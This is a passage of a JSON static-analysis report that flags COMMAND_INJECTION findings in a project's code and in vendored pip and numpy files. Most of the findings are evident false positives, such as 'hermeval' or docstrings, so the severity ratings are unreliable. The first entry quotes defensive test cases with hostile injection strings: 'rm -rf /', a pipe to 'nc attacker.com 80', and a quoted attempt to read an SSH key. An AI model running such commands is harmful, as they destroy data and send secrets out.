            "evidence": "([\"python\", \"-c\", \"import os; os.system('rm -rf /')\"], False, \"Python injection attempt\"),",
            "context": "                # Injection attempts (should fail)\n                ([\"cargo\", \"test\", \"; rm -rf /\"], False, \"Command injection attempt\"),\n                ([\"git\", \"status\", \"| nc attacker.com 80\"], False, \"Pipe injection attempt\"),\n                ([\"python\", \"-c\", \"import os; os.system('rm -rf /')\"], False, \"Python injection attempt\"),\n            ]\n            \n            passed = 0",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/benchmarks/performance_monitor.py",
            "line": 407,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "os.system('clear' if os.name == 'posix' else 'cls')",
            "context": "        try:\n            while True:\n                # Clear screen (works on Unix-like systems)\n                os.system('clear' if os.name == 'posix' else 'cls')\n                \n                # Get current metrics\n                metrics = self.monitor.get_current_metrics()",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/six.py",
            "line": 735,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec(\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\"\"\"def reraise(tp, value, tb=None):\n    try:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
            "line": 1251,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(unless you are familiar with how eval() and exec() work).  The",
            "context": "        present.\n\n        BEWARE -- the behavior of globalns and localns is counterintuitive\n        (unless you are familiar with how eval() and exec() work).  The\n        search order is locals first, then globals.\n\n        - If no dict arguments are passed, an attempt is made to use the",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 10,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile('''",
            "context": "# Windows are correctly handled (it should be \"C:\\\\Users\" not \"C:\\Users\").\n_SETUPTOOLS_SHIM = textwrap.dedent(\n    \"\"\"\n    exec(compile('''\n    # This is <pip-setuptools-caller> -- a caller that pip uses to run setup.py\n    #\n    # - It imports setuptools before invoking setup.py, to enable projects that directly",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/utils/setuptools_build.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(compile(setup_py_code, filename, \"exec\"))",
            "context": "        filename = \"<auto-generated setuptools caller>\"\n        setup_py_code = \"from setuptools import setup; setup()\"\n\n    exec(compile(setup_py_code, filename, \"exec\"))\n    ''' % ({!r},), \"<pip-setuptools-caller>\", \"exec\"))\n    \"\"\"\n).rstrip()",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/commands/configuration.py",
            "line": 239,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subprocess.check_call(f'{editor} \"{fname}\"', shell=True)",
            "context": "            )\n\n        try:\n            subprocess.check_call(f'{editor} \"{fname}\"', shell=True)\n        except FileNotFoundError as e:\n            if not e.filename:\n                e.filename = editor",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/results.py",
            "line": 57,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "print(f\"{s} -> {fn(eval(s))}\")",
            "context": "        result = date_str.parse_string(\"1999/12/31\")\n\n        def test(s, fn=repr):\n            print(f\"{s} -> {fn(eval(s))}\")\n        test(\"list(result)\")\n        test(\"result[0]\")\n        test(\"result['month']\")",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1561,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, namespace, namespace)",
            "context": "            with open(script_filename) as fid:\n                source = fid.read()\n            code = compile(source, script_filename, 'exec')\n            exec(code, namespace, namespace)\n        else:\n            from linecache import cache\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1572,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(script_code, namespace, namespace)",
            "context": "                script_filename,\n            )\n            script_code = compile(script_text, script_filename, 'exec')\n            exec(script_code, namespace, namespace)\n\n    def _has(self, path):\n        raise NotImplementedError(",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/rich/markup.py",
            "line": 184,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "meta_params = literal_eval(parameters)",
            "context": "                            )\n\n                        try:\n                            meta_params = literal_eval(parameters)\n                        except SyntaxError as error:\n                            raise MarkupError(\n                                f\"error parsing {parameters!r} in {open_tag.parameters!r}; {error.msg}\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
            "line": 787,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")",
            "context": "            del frame\n        elif _locs_ is None:\n            _locs_ = _globs_\n        exec (\"\"\"exec _code_ in _globs_, _locs_\"\"\")\n\n    exec_(\n        \"\"\"def reraise(tp, value, tb=None):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "this method is equivalent to running ``eval()`` on the input file. The formatter is",
            "context": "\n    The file is expected to contain a Formatter class named ``formattername``\n    (by default, CustomFormatter). Users should be very careful with the input, because\n    this method is equivalent to running ``eval()`` on the input file. The formatter is\n    given the `options` at its instantiation.\n\n    :exc:`pygments.util.ClassNotFound` is raised if there are any errors loading",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/formatters/__init__.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `formattername` from that namespace\n        if formattername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/lexers/__init__.py",
            "line": 153,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(f.read(), custom_namespace)",
            "context": "        # This empty dict will contain the namespace for the exec'd file\n        custom_namespace = {}\n        with open(filename, 'rb') as f:\n            exec(f.read(), custom_namespace)\n        # Retrieve the class `lexername` from that namespace\n        if lexername not in custom_namespace:\n            raise ClassNotFound('no valid %s class found in %s' %",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 246,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(0,hermeline(3, 2))",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermeline\n    >>> from numpy.polynomial.hermite_e import hermeline, hermeval\n    >>> hermeval(0,hermeline(3, 2))\n    3.0\n    >>> hermeval(1,hermeline(3, 2))\n    5.0",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 248,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(1,hermeline(3, 2))",
            "context": "    >>> from numpy.polynomial.hermite_e import hermeline, hermeval\n    >>> hermeval(0,hermeline(3, 2))\n    3.0\n    >>> hermeval(1,hermeline(3, 2))\n    5.0\n\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 304,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval((-1, 0, 1), coef)",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermefromroots, hermeval\n    >>> coef = hermefromroots((-1, 0, 1))\n    >>> hermeval((-1, 0, 1), coef)\n    array([0., 0., 0.])\n    >>> coef = hermefromroots((-1j, 1j))\n    >>> hermeval((-1j, 1j), coef)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 307,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval((-1j, 1j), coef)",
            "context": "    >>> hermeval((-1, 0, 1), coef)\n    array([0., 0., 0.])\n    >>> coef = hermefromroots((-1j, 1j))\n    >>> hermeval((-1j, 1j), coef)\n    array([0.+0.j, 0.+0.j])\n\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 791,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tmp[0] += k[i] - hermeval(lbnd, tmp)",
            "context": "            tmp[1] = c[0]\n            for j in range(1, n):\n                tmp[j + 1] = c[j] / (j + 1)\n            tmp[0] += k[i] - hermeval(lbnd, tmp)\n            c = tmp\n    c = np.moveaxis(c, 0, iaxis)\n    return c",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 797,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def hermeval(x, c, tensor=True):",
            "context": "    return c\n\n\ndef hermeval(x, c, tensor=True):\n    \"\"\"\n    Evaluate an HermiteE series at points x.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 857,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval(1, coef)",
            "context": "    --------\n    >>> from numpy.polynomial.hermite_e import hermeval\n    >>> coef = [1,2,3]\n    >>> hermeval(1, coef)\n    3.0\n    >>> hermeval([[1,2],[3,4]], coef)\n    array([[ 3., 14.],",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 859,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> hermeval([[1,2],[3,4]], coef)",
            "context": "    >>> coef = [1,2,3]\n    >>> hermeval(1, coef)\n    3.0\n    >>> hermeval([[1,2],[3,4]], coef)\n    array([[ 3., 14.],\n           [31., 54.]])\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 1088,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "``hermeval(x, c)`` are the same up to roundoff. This equivalence is",
            "context": "\n    If `c` is a 1-D array of coefficients of length ``n + 1`` and `V` is the\n    array ``V = hermevander(x, n)``, then ``np.dot(V, c)`` and\n    ``hermeval(x, c)`` are the same up to roundoff. This equivalence is\n    useful both for least squares fitting and for the evaluation of a large\n    number of HermiteE series of the same degree and sample points.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/hermite_e.py",
            "line": 1357,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> y = hermeval(x, [1, 2, 3]) + err",
            "context": "    >>> x = np.linspace(-10, 10)\n    >>> rng = np.random.default_rng()\n    >>> err = rng.normal(scale=1./10, size=len(x))\n    >>> y = hermeval(x, [1, 2, 3]) + err\n    >>> hermefit(x, y, 2)\n    array([1.02284196, 2.00032805, 2.99978457]) # may vary\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/tests/test_public_api.py",
            "line": 407,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "eval(module_name)",
            "context": "\n    for module_name in PUBLIC_ALIASED_MODULES:\n        try:\n            eval(module_name)\n        except AttributeError:\n            module_names.append(module_name)\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 536,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Raises\n    ------",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 563,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Returns\n    -------",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 658,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = ast.literal_eval(header)",
            "context": "    #\n    # For performance reasons, we try without _filter_header first though\n    try:\n        d = ast.literal_eval(header)\n    except SyntaxError as e:\n        if version <= (2, 0):\n            header = _filter_header(header)",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 663,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "d = ast.literal_eval(header)",
            "context": "        if version <= (2, 0):\n            header = _filter_header(header)\n            try:\n                d = ast.literal_eval(header)\n            except SyntaxError as e2:\n                msg = \"Cannot parse header: {!r}\"\n                raise ValueError(msg.format(header)) from e2",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 799,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_format_impl.py",
            "line": 927,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n\n    Returns\n    -------",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 578,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def safe_eval(source):",
            "context": "        print(inspect.getdoc(object), file=output)\n\n\ndef safe_eval(source):\n    \"\"\"\n    Protected string evaluation.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 612,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('1')",
            "context": "\n    Examples\n    --------\n    >>> np.safe_eval('1')\n    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 614,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('[1, 2, 3]')",
            "context": "    --------\n    >>> np.safe_eval('1')\n    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]\n    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 616,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')",
            "context": "    1\n    >>> np.safe_eval('[1, 2, 3]')\n    [1, 2, 3]\n    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}\n\n    >>> np.safe_eval('import os')",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 619,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('import os')",
            "context": "    >>> np.safe_eval('{\"foo\": (\"bar\", 10.0)}')\n    {'foo': ('bar', 10.0)}\n\n    >>> np.safe_eval('import os')\n    Traceback (most recent call last):\n      ...\n    SyntaxError: invalid syntax",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> np.safe_eval('open(\"/home/user/.ssh/id_dsa\").read()')",
            "context": "      ...\n    SyntaxError: invalid syntax\n\n    >>> np.safe_eval('open(\"/home/user/.ssh/id_dsa\").read()')\n    Traceback (most recent call last):\n      ...\n    ValueError: malformed node or string: <_ast.Call object at 0x...>",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 642,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return ast.literal_eval(source)",
            "context": "\n    # Local import to speed up numpy's import time.\n    import ast\n    return ast.literal_eval(source)\n\n\ndef _median_nancheck(data, result, axis):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_npyio_impl.py",
            "line": 151,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/lib/_npyio_impl.py",
            "line": 356,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "See :py:func:`ast.literal_eval()` for details.",
            "context": "    max_header_size : int, optional\n        Maximum allowed size of the header.  Large headers may not be safe\n        to load securely and thus require explicitly passing a larger value.\n        See :py:func:`ast.literal_eval()` for details.\n        This option is ignored when `allow_pickle` is passed.  In that case\n        the file is by definition trusted and the limit is unnecessary.\n",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 632,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(f\"{l1}:{' and '.join(l2)}\")",
            "context": "    for i in range(len(f)):\n        l1 = '%s,f%d=f[%d]' % (l1, i, i)\n        l2.append('f%d(v)' % (i))\n    return eval(f\"{l1}:{' and '.join(l2)}\")\n\n\ndef l_or(*f):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 640,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval(f\"{l1}:{' or '.join(l2)}\")",
            "context": "    for i in range(len(f)):\n        l1 = '%s,f%d=f[%d]' % (l1, i, i)\n        l2.append('f%d(v)' % (i))\n    return eval(f\"{l1}:{' or '.join(l2)}\")\n\n\ndef l_not(f):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/auxfuncs.py",
            "line": 644,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return eval('lambda v,f=f:not f(v)')",
            "context": "\n\ndef l_not(f):\n    return eval('lambda v,f=f:not f(v)')\n\n\ndef isdummyroutine(rout):",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 1329,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = eval(initexpr, {}, params)",
            "context": "                    initexpr = initexpr[1:].lower().replace('d', 'e').\\\n                        replace(',', '+1j*(')\n            try:\n                v = eval(initexpr, {}, params)\n            except (SyntaxError, NameError, TypeError) as msg:\n                errmess('analyzeline: Failed to evaluate %r. Ignoring: %s\\n'\n                        % (initexpr, msg))",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2269,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def myeval(e, g=None, l=None):",
            "context": "    return implicitrules, attrrules\n\n\ndef myeval(e, g=None, l=None):\n    \"\"\" Like `eval` but returns only integers and floats \"\"\"\n    r = eval(e, g, l)\n    if type(r) in [int, float]:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2271,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "r = eval(e, g, l)",
            "context": "\ndef myeval(e, g=None, l=None):\n    \"\"\" Like `eval` but returns only integers and floats \"\"\"\n    r = eval(e, g, l)\n    if type(r) in [int, float]:\n        return r\n    raise ValueError(f'r={r!r}')",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2302,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c = int(myeval(e, {}, {}))",
            "context": "    (2.0, 3.0, 'x')\n    \"\"\"\n    try:\n        c = int(myeval(e, {}, {}))\n        return 0, c, None\n    except Exception:\n        pass",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2323,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b = myeval(ee, {}, {})",
            "context": "                while m1:\n                    ee = f\"{m1.group('before')}({0}){m1.group('after')}\"\n                    m1 = re_1.match(ee)\n                b = myeval(ee, {}, {})\n                m1 = re_1.match(e)\n                while m1:\n                    ee = f\"{m1.group('before')}({1}){m1.group('after')}\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2328,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "a = myeval(ee, {}, {}) - b",
            "context": "                while m1:\n                    ee = f\"{m1.group('before')}({1}){m1.group('after')}\"\n                    m1 = re_1.match(ee)\n                a = myeval(ee, {}, {}) - b\n                m1 = re_1.match(e)\n                while m1:\n                    ee = f\"{m1.group('before')}({0.5}){m1.group('after')}\"",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2333,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c = myeval(ee, {}, {})",
            "context": "                while m1:\n                    ee = f\"{m1.group('before')}({0.5}){m1.group('after')}\"\n                    m1 = re_1.match(ee)\n                c = myeval(ee, {}, {})\n                # computing another point to be sure that expression is linear\n                m1 = re_1.match(e)\n                while m1:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2339,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "c2 = myeval(ee, {}, {})",
            "context": "                while m1:\n                    ee = f\"{m1.group('before')}({1.5}){m1.group('after')}\"\n                    m1 = re_1.match(ee)\n                c2 = myeval(ee, {}, {})\n                if (a * 0.5 + b == c and a * 1.5 + b == c2):\n                    return a, b, x\n            except Exception:",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2529,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "params[n] = param_eval(v, g_params, params, dimspec=dimspec)",
            "context": "            elif real8pattern.search(v):\n                v = 4\n            try:\n                params[n] = param_eval(v, g_params, params, dimspec=dimspec)\n            except Exception as msg:\n                params[n] = v\n                outmess(f'get_parameters: got \"{msg}\" on {n!r}\\n')",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2559,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = eval(value, {}, params)",
            "context": "        value = value.split('_')[0]\n    try:\n        # TODO: use symbolic from PR #19805\n        value = eval(value, {}, params)\n        value = (repr if isinstance(value, str) else str)(value)\n    except (NameError, SyntaxError, TypeError):\n        return value",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2637,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "l = str(eval(l, {}, params))",
            "context": "            if 'len' in vars[n]['charselector']:\n                l = vars[n]['charselector']['len']\n                try:\n                    l = str(eval(l, {}, params))\n                except Exception:\n                    pass\n                vars[n]['charselector']['len'] = l",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2646,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "l = str(eval(l, {}, params))",
            "context": "            if 'kind' in vars[n]['kindselector']:\n                l = vars[n]['kindselector']['kind']\n                try:\n                    l = str(eval(l, {}, params))\n                except Exception:\n                    pass\n                vars[n]['kindselector']['kind'] = l",
            "cvss_score": 7.5
          },
          {
            "file": "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/crackfortran.py",
            "line": 2914,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "kindselect['kind'] = eval(",
            "context": "                        if kindselect:\n                            if 'kind' in kindselect:\n                                try:\n                                    kindselect['kind'] = eval(\n                                        kindselect['kind'], {}, params)\n                                except Exception:\n                                    pass",
            "cvss_score": 7.5
          },
          {
